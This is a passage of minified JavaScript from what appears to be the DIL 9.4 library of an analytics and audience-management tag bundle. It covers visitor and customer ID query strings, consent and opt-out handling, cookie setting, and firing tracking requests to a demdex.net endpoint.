            return e(this.mid) && this.mid === t || (this.mid = t), e(this.mid) ? "d_mid=" + this.mid + "&" : "";
          },
          getCustomerIDs: function () {
            return this.instance ? this.instance.getCustomerIDs() : null;
          },
          getCustomerIDsQueryString: function (e) {
            if (e !== Object(e)) return "";
            var t,
              n,
              i,
              r,
              a = "",
              s = [],
              o = [];
            for (t in e) e.hasOwnProperty(t) && (n = e[o[0] = t]) === Object(n) && (o[1] = n.id || "", o[2] = n.authState || 0, s.push(o), o = []);
            if (r = s.length) for (i = 0; i < r; i++) a += "&d_cid_ic=" + q.encodeAndBuildRequest(s[i], "%01");
            return a;
          },
          getIsOptedOut: function () {
            this.instance ? this.instance.isOptedOut([this, this.isOptedOutCallback], this.VisitorAPI.OptOut.GLOBAL, !0) : (this.isOptedOut = !1, this.isOptedOutCallbackCalled = !0);
          },
          isOptedOutCallback: function (e) {
            this.isOptedOut = e, this.isOptedOutCallbackCalled = !0, A.registerRequest(), F.isIabContext() && Q.checkQueryStringObject();
          },
          getLoadTimeout: function () {
            var e = this.instance;
            if (e) {
              if ("function" == typeof e.getLoadTimeout) return e.getLoadTimeout();
              if (void 0 !== e.loadTimeout) return e.loadTimeout;
            }
            return this.TIME_TO_CATCH_ALL_REQUESTS_RELEASE;
          }
        },
        declaredId: {
          declaredId: {
            init: null,
            request: null
          },
          declaredIdCombos: {},
          setDeclaredId: function (e, t) {
            var n = j.isPopulatedString,
              i = encodeURIComponent;
            if (e === Object(e) && n(t)) {
              var r = e.dpid,
                a = e.dpuuid,
                s = null;
              if (n(r) && n(a)) return s = i(r) + "$" + i(a), !0 === this.declaredIdCombos[s] ? "setDeclaredId: combo exists for type '" + t + "'" : (this.declaredIdCombos[s] = !0, this.declaredId[t] = {
                dpid: r,
                dpuuid: a
              }, "setDeclaredId: succeeded for type '" + t + "'");
            }
            return "setDeclaredId: failed for type '" + t + "'";
          },
          getDeclaredIdQueryString: function () {
            var e = this.declaredId.request,
              t = this.declaredId.init,
              n = encodeURIComponent,
              i = "";
            return null !== e ? i = "&d_dpid=" + n(e.dpid) + "&d_dpuuid=" + n(e.dpuuid) : null !== t && (i = "&d_dpid=" + n(t.dpid) + "&d_dpuuid=" + n(t.dpuuid)), i;
          }
        },
        registerRequest: function (e) {
          var t,
            n = this.firingQueue;
          e === Object(e) && (n.push(e), e.isDefaultRequest || (_ = !0)), this.firing || !n.length || p && !DIL.windowLoaded || (this.adms.isOptedOutCallbackCalled || this.adms.getIsOptedOut(), this.adms.calledBack && !this.adms.isOptedOut && this.adms.isOptedOutCallbackCalled && (F.isApproved() || Q.hasGoSignal()) && (this.adms.isOptedOutCallbackCalled = !1, (t = n.shift()).src = t.src.replace(/&d_nsid=/, "&" + this.adms.getMIDQueryString() + Q.getQueryString() + "d_nsid="), j.isPopulatedString(t.corsPostData) && (t.corsPostData = t.corsPostData.replace(/^d_nsid=/, this.adms.getMIDQueryString() + Q.getQueryString() + "d_nsid=")), N.fireRequest(t), this.firstRequestHasFired || "script" !== t.tag && "cors" !== t.tag || (this.firstRequestHasFired = !0)));
        },
        processVisitorAPI: function () {
          this.adms.process(y || window.Visitor);
        },
        getCoopQueryString: function () {
          var e = "";
          return !0 === g ? e = "&d_coop_safe=1" : !1 === g && (e = "&d_coop_unsafe=1"), e;
        }
      };
    I.requestController = A;
    var P,
      E,
      R = {
        sendingMessages: !1,
        messages: [],
        messagesPosted: [],
        destinations: [],
        destinationsPosted: [],
        jsonForComparison: [],
        jsonDuplicates: [],
        jsonWaiting: [],
        jsonProcessed: [],
        publishDestinationsVersion: null,
        requestToProcess: function (e, t) {
          function n() {
            r.jsonForComparison.push(e), r.jsonWaiting.push([e, t]);
          }
          var i,
            r = this;
          if (e && !j.isEmptyObject(e)) if (i = JSON.stringify(e.dests || []), this.jsonForComparison.length) {
            var a,
              s,
              o,
              c = !1;
            for (a = 0, s = this.jsonForComparison.length; a < s; a++) if (o = this.jsonForComparison[a], i === JSON.stringify(o.dests || [])) {
              c = !0;
              break;
            }
            c ? this.jsonDuplicates.push(e) : n();
          } else n();
          if (this.jsonWaiting.length) {
            var l = this.jsonWaiting.shift();
            this.process(l[0], l[1]), this.requestToProcess();
          }
          this.messages.length && !this.sendingMessages && this.sendMessages();
        },
        process: function (e) {
          if (m) {
            var t,
              n,
              i,
              r,
              a,
              s,
              o = encodeURIComponent,
              c = this.getPublishDestinationsVersion(),
              l = !1;
            if (-1 !== c) {
              if ((t = e.dests) && t instanceof Array && (n = t.length)) {
                for (i = 0; i < n; i++) r = t[i], s = [o("dests"), o(r.id || ""), o(r.y || ""), o(r.c || "")].join("|"), this.addMessage(s), a = {
                  url: r.c,
                  hideReferrer: void 0 === r.hr || !!r.hr,
                  message: s
                }, this.addDestination(a), void 0 !== r.hr && (l = !0);
                1 === c && l && O.logOnce("Warning: visitorInstance.publishDestinations version is old (Visitor v3.3.0 to v4.0.0). URL destinations will not have the option of being fired on page, only in the iframe.");
              }
              this.jsonProcessed.push(e);
            }
          }
        },
        addMessage: function (e) {
          this.messages.push(e);
        },
        addDestination: function (e) {
          this.destinations.push(e);
        },
        sendMessages: function () {
          this.sendingMessages || (this.sendingMessages = !0, m && this.messages.length && this.publishDestinations());
        },
        publishDestinations: function () {
          function e(e) {
            O.log("visitor.publishDestinations() result: " + (e.error || e.message)), n.sendingMessages = !1, n.requestToProcess();
          }
          function t() {
            n.messages = [], n.destinations = [];
          }
          var n = this,
            i = A.adms.instance,
            r = [],
            s = [];
          return 1 === this.publishDestinationsVersion ? (q.extendArray(r, this.messages), q.extendArray(this.messagesPosted, this.messages), t(), i.publishDestinations(a, r, e), "Called visitor.publishDestinations() version 1") : 1 < this.publishDestinationsVersion ? (q.extendArray(s, this.destinations), q.extendArray(this.destinationsPosted, this.destinations), t(), i.publishDestinations({
            subdomain: a,
            callback: e,
            urlDestinations: s
          }), "Called visitor.publishDestinations() version > 1") : void 0;
        },
        getPublishDestinationsVersion: function () {
          if (null !== this.publishDestinationsVersion) return this.publishDestinationsVersion;
          var e = A.adms.instance,
            t = -1;
          return e.publishDestinations(null, null, function (e) {
            if (e === Object(e)) {
              var n = e.error;
              "subdomain is not a populated string." === n ? t = 1 : "Invalid parameters passed." === n && (t = 2);
            }
          }), this.publishDestinationsVersion = t;
        }
      },
      M = {
        traits: function (e) {
          return j.isValidPdata(e) && (V.sids instanceof Array || (V.sids = []), q.extendArray(V.sids, e)), this;
        },
        pixels: function (e) {
          return j.isValidPdata(e) && (V.pdata instanceof Array || (V.pdata = []), q.extendArray(V.pdata, e)), this;
        },
        logs: function (e) {
          return j.isValidLogdata(e) && (V.logdata !== Object(V.logdata) && (V.logdata = {}), q.extendObject(V.logdata, e)), this;
        },
        customQueryParams: function (e) {
          return j.isEmptyObject(e) || q.extendObject(V, e, A.reservedKeys), this;
        },
        signals: function (e, t) {
          var n,
            i = e;
          if (!j.isEmptyObject(i)) {
            if (t && "string" == typeof t) for (n in i = {}, e) e.hasOwnProperty(n) && (i[t + n] = e[n]);
            q.extendObject(V, i, A.reservedKeys);
          }
          return this;
        },
        declaredId: function (e) {
          return A.declaredId.setDeclaredId(e, "request"), this;
        },
        result: function (e) {
          return "function" == typeof e && (V.callback = e), this;
        },
        afterResult: function (e) {
          return "function" == typeof e && (V.postCallbackFn = e), this;
        },
        useImageRequest: function () {
          return V.useImageRequest = !0, this;
        },
        clearData: function () {
          return V = {}, this;
        },
        submit: function (e) {
          return V.isDefaultRequest = !!e, N.submitRequest(V), V = {}, this;
        },
        getPartner: function () {
          return a;
        },
        getContainerNSID: function () {
          return s;
        },
        getEventLog: function () {
          return D;
        },
        getState: function () {
          var t = {},
            n = {};
          return q.extendObject(t, A, {
            registerRequest: !0
          }), q.extendObject(n, R, {
            requestToProcess: !0,
            process: !0,
            sendMessages: !0
          }), {
            initConfig: e,
            pendingRequest: V,
            otherRequestInfo: t,
            destinationPublishingInfo: n,
            log: D
          };
        },
        idSync: function () {
          throw new Error("Please use the `idSyncByURL` method of the Experience Cloud ID Service (Visitor) instance");
        },
        aamIdSync: function () {
          throw new Error("Please use the `idSyncByDataSource` method of the Experience Cloud ID Service (Visitor) instance");
        },
        passData: function (e) {
          return j.isEmptyObject(e) ? "Error: json is empty or not an object" : (N.defaultCallback(e), e);
        },
        getPlatformParams: function () {
          return A.platformParams;
        },
        getEventCallConfigParams: function () {
          var e,
            t = A,
            n = t.modStatsParams,
            i = t.platformParams;
          if (!n) {
            for (e in n = {}, i) i.hasOwnProperty(e) && !t.nonModStatsParams[e] && (n[e.replace(/^d_/, "")] = i[e]);
            !0 === g ? n.coop_safe = 1 : !1 === g && (n.coop_unsafe = 1), t.modStatsParams = n;
          }
          return n;
        },
        setAsCoopSafe: function () {
          return g = !0, this;
        },
        setAsCoopUnsafe: function () {
          return g = !1, this;
        },
        getEventCallIabSignals: function (e) {
          var t;
          return e !== Object(e) ? "Error: config is not an object" : "function" != typeof e.callback ? "Error: config.callback is not a function" : (t = parseInt(e.timeout, 10), isNaN(t) && (t = null), void Q.getQueryStringObject(e.callback, t));
        }
      },
      N = {
        corsMetadata: (P = "none", "undefined" != typeof XMLHttpRequest && XMLHttpRequest === Object(XMLHttpRequest) && "withCredentials" in new XMLHttpRequest() && (P = "XMLHttpRequest"), {
          corsType: P
        }),
        getCORSInstance: function () {
          return "none" === this.corsMetadata.corsType ? null : new window[this.corsMetadata.corsType]();
        },
        submitRequest: function (e) {
          return A.registerRequest(N.createQueuedRequest(e)), !0;
        },
        createQueuedRequest: function (e) {
          var t,
            n,
            i,
            r,
            a,
            s = e.callback,
            c = "img",
            l = e.isDefaultRequest;
          if (delete e.isDefaultRequest, !j.isEmptyObject(o)) for (i in o) if (o.hasOwnProperty(i)) {
            if (null == (r = o[i]) || "" === r) continue;
            if (i in e && !(r in e) && !(r in A.reservedKeys)) {
              if (null == (a = e[i]) || "" === a) continue;
              e[r] = a;
            }
          }
          return j.isValidPdata(e.sids) || (e.sids = []), j.isValidPdata(e.pdata) || (e.pdata = []), j.isValidLogdata(e.logdata) || (e.logdata = {}), e.logdataArray = q.convertObjectToKeyValuePairs(e.logdata, "=", !0), e.logdataArray.push("_ts=" + new Date().getTime()), "function" != typeof s && (s = this.defaultCallback), t = this.makeRequestSrcData(e), (n = this.getCORSInstance()) && !0 !== e.useImageRequest && (c = "cors"), {
            tag: c,
            src: t.src,
            corsSrc: t.corsSrc,
            callbackFn: s,
            postCallbackFn: e.postCallbackFn,
            useImageRequest: !!e.useImageRequest,
            requestData: e,
            corsInstance: n,
            corsPostData: t.corsPostData,
            isDefaultRequest: l
          };
        },
        defaultCallback: function (e, t) {
          var n, i, r, a, s, o, l, u, d;
          if (b && (n = e.stuff) && n instanceof Array && (i = n.length)) for (r = 0; r < i; r++) (a = n[r]) && a === Object(a) && (s = a.cn, o = a.cv, void 0 !== (l = a.ttl) && "" !== l || (l = Math.floor(q.getMaxCookieExpiresInMinutes() / 60 / 24)), u = a.dmn || "." + document.domain.replace(/^www\./, ""), d = a.type, s && (o || "number" == typeof o) && ("var" !== d && (l = parseInt(l, 10)) && !isNaN(l) && q.setCookie(s, o, 24 * l * 60, "/", u, !1), L.stuffed[s] = o));
          var p,
            f,
            g = e.uuid;
          j.isPopulatedString(g) && (j.isEmptyObject(c) || ("string" == typeof (p = c.path) && p.length || (p = "/"), f = parseInt(c.days, 10), isNaN(f) && (f = 100), q.setCookie(c.name || "aam_did", g, 24 * f * 60, p, c.domain || "." + document.domain.replace(/^www\./, ""), !0 === c.secure))), A.abortRequests || R.requestToProcess(e, t);
        },
        makeRequestSrcData: function (e) {
          e.sids = j.removeEmptyArrayValues(e.sids || []), e.pdata = j.removeEmptyArrayValues(e.pdata || []);
          var t = A,
            n = t.platformParams,
            i = q.encodeAndBuildRequest(e.sids, ","),
            r = q.encodeAndBuildRequest(e.pdata, ","),
            s = (e.logdataArray || []).join("&");
          delete e.logdataArray;
          var o,
            c,
            l = encodeURIComponent,
            u = S.IS_HTTPS ? "https://" : "http://",
            d = t.declaredId.getDeclaredIdQueryString(),
            p = t.adms.instance ? t.adms.getCustomerIDsQueryString(t.adms.getCustomerIDs()) : "",
            f = function () {
              var n,
                i,
                r,
                a,
                s = [];
              for (n in e) if (!(n in t.reservedKeys) && e.hasOwnProperty(n)) if (i = e[n], n = l(n), i instanceof Array) for (r = 0, a = i.length; r < a; r++) s.push(n + "=" + l(i[r]));else s.push(n + "=" + l(i));
              return s.length ? "&" + s.join("&") : "";
            }(),
            g = "d_dil_ver=" + l(DIL.version),
            h = "d_nsid=" + n.d_nsid + t.getCoopQueryString() + d + p + (i.length ? "&d_sid=" + i : "") + (r.length ? "&d_px=" + r : "") + (s.length ? "&d_ld=" + l(s) : ""),
            m = "&d_rtbd=" + n.d_rtbd + "&d_jsonv=" + n.d_jsonv + "&d_dst=" + n.d_dst,
            b = v ? "&h_referer=" + l(location.href) : "";
          return c = (o = u + a + ".demdex.net/event") + "?" + g + "&" + h + m + f + b, {
            corsSrc: o + "?" + g + "&_ts=" + new Date().getTime(),
            src: c,
            corsPostData: h + m + f + b,
            isDeclaredIdCall: "" !== d
          };
        },
        fireRequest: function (e) {
          if ("img" === e.tag) this.fireImage(e);else {
            var t = A.declaredId,
              n = t.declaredId.request || t.declaredId.init || {},
              i = {
                dpid: n.dpid || "",
                dpuuid: n.dpuuid || ""
              };
            this.fireCORS(e, i);
          }
        },
        fireImage: function (e) {
          var t,
            n,
            r = A;
          r.abortRequests || (r.firing = !0, t = new Image(0, 0), r.sent.push(e), t.onload = function () {
            r.firing = !1, r.fired.push(e), r.num_of_img_responses++, r.registerRequest();
          }, n = function (t) {
            i = "imgAbortOrErrorHandler received the event of type " + t.type, O.log(i), r.abortRequests = !0, r.firing = !1, r.errored.push(e), r.num_of_img_errors++, r.registerRequest();
          }, t.addEventListener("error", n), t.addEventListener("abort", n), t.src = e.src);
        },
        fireCORS: function (e, t) {
          var n = this,
            r = A,
            s = this.corsMetadata.corsType,
            o = e.corsSrc,
            c = e.corsInstance,
            l = e.corsPostData,
            u = e.postCallbackFn,
            d = "function" == typeof u;
          if (!r.abortRequests && !w) {
            r.firing = !0;
            try {
              c.open("post", o, !0), "XMLHttpRequest" === s && (c.withCredentials = !0, c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.onreadystatechange = function () {
                4 === this.readyState && 200 === this.status && function (s) {
                  var o;
                  try {
                    if ((o = JSON.parse(s)) !== Object(o)) return n.handleCORSError(e, t, "Response is not JSON");
                  } catch (s) {
                    return n.handleCORSError(e, t, "Error parsing response as JSON");
                  }
                  try {
                    var c = e.callbackFn;
                    r.firing = !1, r.fired.push(e), r.num_of_cors_responses++, c(o, t), d && u(o, t);
                  } catch (s) {
                    s.message = "DIL handleCORSResponse caught error with message " + s.message, i = s.message, O.log(i), s.filename = s.filename || "dil.js", s.partner = a, DIL.errorModule.handleError(s);
                    try {
                      c({
                        error: s.name + "|" + s.message
                      }, t), d && u({
                        error: s.name + "|" + s.message
                      }, t);
                    } catch (s) {}
                  } finally {
                    r.registerRequest();
                  }
                }(this.responseText);
              }), c.onerror = function () {
                n.handleCORSError(e, t, "onerror");
              }, c.ontimeout = function () {
                n.handleCORSError(e, t, "ontimeout");
              }, c.send(l);
            } catch (s) {
              this.handleCORSError(e, t, "try-catch");
            }
            r.sent.push(e), r.declaredId.declaredId.request = null;
          }
        },
        handleCORSError: function (e, t, n) {
          A.num_of_cors_errors++, A.corsErrorSources.push(n);
        }
      },
      j = {
        isValidPdata: function (e) {
          return !!(e instanceof Array && this.removeEmptyArrayValues(e).length);
        },
        isValidLogdata: function (e) {
          return !this.isEmptyObject(e);
        },
        isEmptyObject: function (e) {
          if (e !== Object(e)) return !0;
          var t;
          for (t in e) if (e.hasOwnProperty(t)) return !1;
          return !0;
        },
        removeEmptyArrayValues: function (e) {
          var t,
            n = 0,
            i = e.length,
            r = [];
          for (n = 0; n < i; n++) null != (t = e[n]) && "" !== t && r.push(t);
          return r;
        },
        isPopulatedString: function (e) {
          return "string" == typeof e && e.length;
        }
      },
      q = {
        convertObjectToKeyValuePairs: function (e, t, n) {
          var i,
            r,
            a = [];
          for (i in t = t || "=", e) e.hasOwnProperty(i) && null != (r = e[i]) && "" !== r && a.push(i + t + (n ? encodeURIComponent(r) : r));
          return a;
        },
        encodeAndBuildRequest: function (e, t) {
          return e.map(function (e) {
            return encodeURIComponent(e);
          }).join(t);
        },
        getCookie: function (e) {
          var t,
            n,
            i,
            r = e + "=",
            a = document.cookie.split(";");
          for (t = 0, n = a.length; t < n; t++) {
            for (i = a[t]; " " === i.charAt(0);) i = i.substring(1, i.length);
            if (0 === i.indexOf(r)) return decodeURIComponent(i.substring(r.length, i.length));
          }
          return null;
        },
        setCookie: function (e, t, n, i, r, a) {
          var s = new Date();
          n = n && 1e3 * n * 60, document.cookie = e + "=" + encodeURIComponent(t) + (n ? ";expires=" + new Date(s.getTime() + n).toUTCString() : "") + (i ? ";path=" + i : "") + (r ? ";domain=" + r : "") + (a ? ";secure" : "");
        },
        extendArray: function (e, t) {
          return e instanceof Array && t instanceof Array && (Array.prototype.push.apply(e, t), !0);
        },
        extendObject: function (e, t, n) {
          var i;
          if (e !== Object(e) || t !== Object(t)) return !1;
          for (i in t) if (t.hasOwnProperty(i)) {
            if (!j.isEmptyObject(n) && i in n) continue;
            e[i] = t[i];
          }
          return !0;
        },
        getMaxCookieExpiresInMinutes: function () {
          return S.SIX_MONTHS_IN_MINUTES;
        },
        replaceMethodsWithFunction: function (e, t) {
          var n;
          if (e === Object(e) && "function" == typeof t) for (n in e) e.hasOwnProperty(n) && "function" == typeof e[n] && (e[n] = t);
        }
      },
      F = (E = I.requestController, {
        exists: null,
        instance: null,
        aamIsApproved: null,
        init: function () {
          var e = this;
          this.checkIfExists() ? (this.exists = !0, this.instance = window.adobe.optIn, this.instance.fetchPermissions(function () {
            e.callback();
          }, !0)) : this.exists = !1;
        },
        checkIfExists: function () {
          return window.adobe === Object(window.adobe) && window.adobe.optIn === Object(window.adobe.optIn);
        },
        callback: function () {
          this.aamIsApproved = this.instance.isApproved([this.instance.Categories.AAM]), E.adms.waitForMidToReleaseRequests(), E.adms.getIsOptedOut();
        },
        isApproved: function () {
          return !this.isIabContext() && !E.adms.isOptedOut && (!this.exists || this.aamIsApproved);
        },
        isIabContext: function () {
          return this.instance && this.instance.isIabContext;
        }
      });
    I.optIn = F;
    var U,
      B,
      H,
      G,
      Q = (B = (U = I).requestController, H = U.optIn, G = {
        isVendorConsented: null,
        doesGdprApply: null,
        consentString: null,
        queryStringObjectCallbacks: [],
        init: function () {
          this.fetchConsentData();
        },
        hasGoSignal: function () {
          return !(!(H.isIabContext() && this.isVendorConsented && this.doesGdprApply && "string" == typeof this.consentString && this.consentString.length) || B.adms.isOptedOut);
        },
        fetchConsentData: function (e, t) {
          var n = this,
            i = {};
          "function" != typeof e && (e = function () {}), H.instance && H.isIabContext() ? (t && (i.timeout = t), H.instance.execute({
            command: "iabPlugin.fetchConsentData",
            params: i,
            callback: function (t, i) {
              i === Object(i) ? (n.doesGdprApply = !!i.gdprApplies, n.consentString = i.consentString || "") : (n.doesGdprApply = !1, n.consentString = ""), n.isVendorConsented = H.instance.isApproved(H.instance.Categories.AAM), t ? e({}) : n.checkQueryStringObject(e), B.adms.waitForMidToReleaseRequests();
            }
          })) : e({});
        },
        getQueryString: function () {
          return H.isIabContext() ? "gdpr=" + (this.doesGdprApply ? 1 : 0) + "&gdpr_consent=" + this.consentString + "&" : "";
        },
        getQueryStringObject: function (e, t) {
          this.fetchConsentData(e, t);
        },
        checkQueryStringObject: function (e) {
          G.hasGoSignal() && "function" == typeof e && e({
            gdpr: this.doesGdprApply ? 1 : 0,
            gdpr_consent: this.consentString
          });
        }
      });
    I.iab = Q, "error" === a && 0 === s && window.addEventListener("load", function () {
      DIL.windowLoaded = !0;
    });
    var W = !1,
      z = function () {
        setTimeout(function () {
          _ || A.firstRequestHasFired || ("function" == typeof k ? M.afterResult(k).submit(!0) : M.submit(!0));
        }, DIL.constants.TIME_TO_DEFAULT_REQUEST);
      },
      Y = document;
    "error" !== a && (DIL.windowLoaded ? n() : "complete" !== Y.readyState && "loaded" !== Y.readyState ? window.addEventListener("load", function () {
      DIL.windowLoaded = !0, n();
    }) : (DIL.windowLoaded = !0, n())), A.declaredId.setDeclaredId(d, "init"), F.init(), Q.init(), A.processVisitorAPI(), S.IS_IE_LESS_THAN_10 && q.replaceMethodsWithFunction(M, function () {
      return this;
    }), this.api = M, this.getStuffedVariable = function (e) {
      var t = L.stuffed[e];
      return t || "number" == typeof t || (t = q.getCookie(e)) || "number" == typeof t || (t = ""), t;
    }, this.validators = j, this.helpers = q, this.constants = S, this.log = D, this.pendingRequest = V, this.requestController = A, this.destinationPublishing = R, this.requestProcs = N, this.units = I, this.initConfig = e, this.logger = O, C && (this.variables = L, this.callWindowLoadFunctions = n);
  }, DIL.extendStaticPropertiesAndMethods = function (e) {
    var t;
    if (e === Object(e)) for (t in e) e.hasOwnProperty(t) && (this[t] = e[t]);
  }, DIL.extendStaticPropertiesAndMethods({
    version: "9.4",
    jsonVersion: 1,
    constants: {
      TIME_TO_DEFAULT_REQUEST: 500
    },
    variables: {
      scriptNodeList: document.getElementsByTagName("script")
    },
    windowLoaded: !1,
    dils: {},
    isAddedPostWindowLoad: function () {
      var e = arguments[0];
      this.windowLoaded = "function" == typeof e ? !!e() : "boolean" != typeof e || e;
    },
    create: function (e) {
      try {
        return new DIL(e);
      } catch (e) {
        throw new Error("Error in attempt to create DIL instance with DIL.create(): " + e.message);
      }
    },
    registerDil: function (e, t, n) {
      var i = t + "$" + n;
      i in this.dils || (this.dils[i] = e);
    },
    getDil: function (e, t) {
      var n;
      return "string" != typeof e && (e = ""), (n = e + "$" + (t = t || 0)) in this.dils ? this.dils[n] : new Error("The DIL instance with partner = " + e + " and containerNSID = " + t + " was not found");
    },
    dexGetQSVars: function (e, t, n) {
      var i = this.getDil(t, n);
      return i instanceof this ? i.getStuffedVariable(e) : "";
    }
  }), DIL.errorModule = (e = DIL.create({
    partner: "error",
    containerNSID: 0,
    ignoreHardDependencyOnVisitorAPI: !0
  }), n = !(t = {
    harvestererror: 14138,
    destpuberror: 14139,
    dpmerror: 14140,
    generalerror: 14137,
    error: 14137,
    noerrortypedefined: 15021,
    evalerror: 15016,
    rangeerror: 15017,
    referenceerror: 15018,
    typeerror: 15019,
    urierror: 15020
  }), {
    activate: function () {
      n = !0;
    },
    handleError: function (i) {
      if (!n) return "DIL error module has not been activated";
      i !== Object(i) && (i = {});
      var r = i.name ? (i.name + "").toLowerCase() : "",
        a = r in t ? t[r] : t.noerrortypedefined,
        s = [],
        o = {
          name: r,
          filename: i.filename ? i.filename + "" : "",
          partner: i.partner ? i.partner + "" : "no_partner",
          site: i.site ? i.site + "" : document.location.href,
          message: i.message ? i.message + "" : ""
        };
      return s.push(a), e.api.pixels(s).logs(o).useImageRequest().submit(), "DIL error report sent";
    },
    pixelMap: t
  }), DIL.tools = {}, DIL.modules = {
    helpers: {}
  });
}(), AppMeasurement.getInstance = s_gi, window.s_objectID || (window.s_objectID = 0), s_pgicq(), fdx_initSCode();